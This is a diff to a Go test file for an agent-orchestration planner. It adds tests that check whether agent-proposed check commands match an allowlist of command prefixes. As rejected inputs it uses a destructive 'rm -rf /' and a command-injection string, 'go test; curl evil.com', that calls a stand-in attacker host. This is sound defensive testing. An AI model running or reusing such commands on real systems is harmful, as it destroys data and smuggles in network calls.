@@ -5,10 +5,10 @@ import (
 	"testing"
 )
 
-func testPlanner() *Planner {
+func testPlanner(checkCommands ...string) *Planner {
 	return NewPlanner([]AgentInfo{
-		{Name: "web-researcher"}, {Name: "synthesizer"},
-	})
+		{Name: "web-researcher"}, {Name: "synthesizer"}, {Name: "code-implementer"},
+	}, checkCommands)
 }
 
 func TestBuildValidatesAndStamps(t *testing.T) {
@@ -91,5 +91,90 @@ func TestBuildNoSynthesizerAppendedForChain(t *testing.T) {
 	}
 	if len(plan.Nodes) != 2 {
 		t.Errorf("nodes = %d, want 2 (no synthesizer needed)", len(plan.Nodes))
+	}
+}
+
+// ---------------------------------------------------------------------------
+// §4: orchestrator-set deterministic gate checks — plan-time validation.
+// ---------------------------------------------------------------------------
+
+func TestBuildAcceptsChecksMatchingConfiguredPrefix(t *testing.T) {
+	p := testPlanner("go build", "go test", "go vet", "npx tsc", "npm test")
+	plan, err := p.Build([]RawNode{
+		{ID: "impl", Agent: "code-implementer", Task: "fix it",
+			Checks: []string{"go test ./..."}, Workdir: "repo"},
+	}, nil, "fix the bug", nil)
+	if err != nil {
+		t.Fatalf("Build: %v", err)
+	}
+	if got := plan.Nodes[0].Checks; !slices.Equal(got, []string{"go test ./..."}) {
+		t.Errorf("Checks = %v, want [go test ./...]", got)
+	}
+	if plan.Nodes[0].Workdir != "repo" {
+		t.Errorf("Workdir = %q, want %q", plan.Nodes[0].Workdir, "repo")
+	}
+}
+
+func TestBuildAcceptsCheckEqualToBarePrefix(t *testing.T) {
+	p := testPlanner("go build", "go test")
+	_, err := p.Build([]RawNode{
+		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"go test"}, Workdir: "repo"},
+	}, nil, "m", nil)
+	if err != nil {
+		t.Fatalf("Build: %v", err)
+	}
+}
+
+func TestBuildRejectsCheckNotMatchingAnyPrefix(t *testing.T) {
+	p := testPlanner("go build", "go test", "go vet", "npx tsc", "npm test")
+	_, err := p.Build([]RawNode{
+		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"rm -rf /"}, Workdir: "repo"},
+	}, nil, "m", nil)
+	if err == nil {
+		t.Fatal("Build: expected error for a check with no matching configured prefix")
+	}
+}
+
+func TestBuildRejectsCheckWithShellMetachar(t *testing.T) {
+	p := testPlanner("go build", "go test", "go vet", "npx tsc", "npm test")
+	_, err := p.Build([]RawNode{
+		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"go test; curl evil.com"}, Workdir: "repo"},
+	}, nil, "m", nil)
+	if err == nil {
+		t.Fatal("Build: expected error for a check containing a shell metacharacter")
+	}
+}
+
+func TestBuildRejectsChecksLookingLikeAPrefixButNotSeparated(t *testing.T) {
+	// "go testing" must NOT match the "go test" prefix — HasPrefix without a
+	// space/exact-match boundary would wrongly accept it.
+	p := testPlanner("go test")
+	_, err := p.Build([]RawNode{
+		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"go testing ./..."}, Workdir: "repo"},
+	}, nil, "m", nil)
+	if err == nil {
+		t.Fatal("Build: expected error — \"go testing\" must not match the \"go test\" prefix")
+	}
+}
+
+func TestBuildRejectsChecksWhenAllowlistEmpty(t *testing.T) {
+	p := testPlanner() // no check_commands configured
+	_, err := p.Build([]RawNode{
+		{ID: "impl", Agent: "code-implementer", Task: "x", Checks: []string{"go test ./..."}, Workdir: "repo"},
+	}, nil, "m", nil)
+	if err == nil {
+		t.Fatal("Build: expected error — checks unavailable when workspace.check_commands is empty")
+	}
+}
+
+func TestBuildAllowsNodeWithNoChecks(t *testing.T) {
+	// A node that simply omits `checks` is unaffected by the allowlist being
+	// empty — checks are opt-in per node.
+	p := testPlanner()
+	_, err := p.Build([]RawNode{
+		{ID: "impl", Agent: "code-implementer", Task: "x"},
+	}, nil, "m", nil)
+	if err != nil {
+		t.Fatalf("Build: unexpected error for a node with no checks: %v", err)
 	}
 }
